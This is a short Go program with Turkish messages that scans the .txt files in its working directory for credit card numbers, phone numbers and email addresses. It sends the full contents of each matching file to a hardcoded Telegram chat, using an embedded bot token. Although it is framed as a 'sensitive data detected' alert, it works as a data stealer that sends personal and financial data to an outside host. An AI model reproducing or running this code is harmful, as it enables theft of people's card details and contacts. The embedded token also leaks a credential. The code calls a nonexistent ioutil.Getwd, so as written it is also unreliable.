package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"regexp"
	"strings"

	"github.com/go-telegram-bot-api/telegram-bot-api"
)

var (
	botToken = "6317232483:AAG8IHpyUQUjqfj-p0oiATbQW-PhW-NWI4c"
	chatID   = int64(1213126048)
)

func isSensitiveData(text string) bool {
	// kredi kartı numaraları ve telefon numaraları, e posta adresleri
	regex := regexp.MustCompile(`\b(?:\d[ -]*?){13,16}\b|\b(?:\+\d{1,2}\s?)?(?:\(\d{3}\)\s?)?\d{3}[ -]?\d{4}\b|\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b`)
	return regex.MatchString(text)
}

func sendToTelegram(message string) {
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Fatal(err)
	}

	msg := tgbotapi.NewMessage(chatID, message)
	bot.Send(msg)
}

func main() {
	currentDir, err := ioutil.Getwd()
	if err != nil {
		log.Fatalf("Hata: %v", err)
	}
	dirPath := currentDir

	files, err := ioutil.ReadDir(dirPath)
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".txt") {
			filePath := fmt.Sprintf("%s\\%s", dirPath, file.Name())
			content, err := ioutil.ReadFile(filePath)
			if err != nil {
				log.Printf("Dosya okunurken hata oluştu: %v", err)
				continue
			} else if isSensitiveData(string(content)) {
				sendToTelegram(fmt.Sprintf("Hassas veri tespit edildi!\nDosya adı: %s\nDosya içeriği:\n%s", file.Name(), string(content)))
			}
		}
	}
}
